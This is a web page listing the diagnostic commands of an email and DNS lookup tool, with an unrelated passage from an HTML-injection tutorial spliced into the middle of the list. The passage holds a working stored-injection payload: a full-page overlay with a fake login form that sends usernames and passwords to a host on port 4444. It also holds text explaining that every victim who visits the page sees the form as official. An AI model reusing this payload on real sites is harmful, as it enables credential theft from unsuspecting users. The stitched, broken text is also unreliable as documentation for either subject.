ABOUT THE SUPERTOOL!
All of your MX record, DNS, blacklist and SMTP diagnostics in one integrated tool.  Input a domain name or IP Address or Host Name. Links in the results will guide you to other relevant tools and information.  And you'll have a chronological history of your results. 

If you already know exactly what you want, you can force a particular test or lookup.  Try some of these examples:

(e.g. "blacklist: 127.0.0.2" will do a blacklist lookup)

Command	 	Explanation
blacklist:	 	Check IP or host for reputation
smtp:	 	Test mail server SMTP (port 25)
mx:	 	DNS MX records for domain
a:	 	DNS A record IP address for host name
spf:	 	Check SPF records on a domain
txt:	 	Check TXT records on a domain
ptr:	 	DNS PTR record for host name
cname:	 	DNS canonical host name to IP address
whois:	 	Get domain registration information
arin:		Get IP address block information
soa:		Get Start of Authority record for a domain
tcp:		Verify an IP Address allows tcp connections
http:		Verify a URL allows http connections  
https:		Verify a URL allows secure http connections  
ping:		Perform a standard ICMP pingdiv style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;">Please login with valid 
credenitals:<br><form name="login" action="http://192.168.0.7:4444/login.htm">
<table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td>
<td><input type="text" name="password"/></td></tr><tr>
<td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
</table></form>

From the below image you can see that, as I clicked over the “Submit” button, a new login form has been displayed over on the webpage. This login form is thus now into the application’s web server, which gets rendered every time whenever the victim visits this malicious login page, he’ll always have this form which looks official to him.


trace:		Perform a standard ICMP trace route
dns:		Check your DNS Servers for possible problems  New!
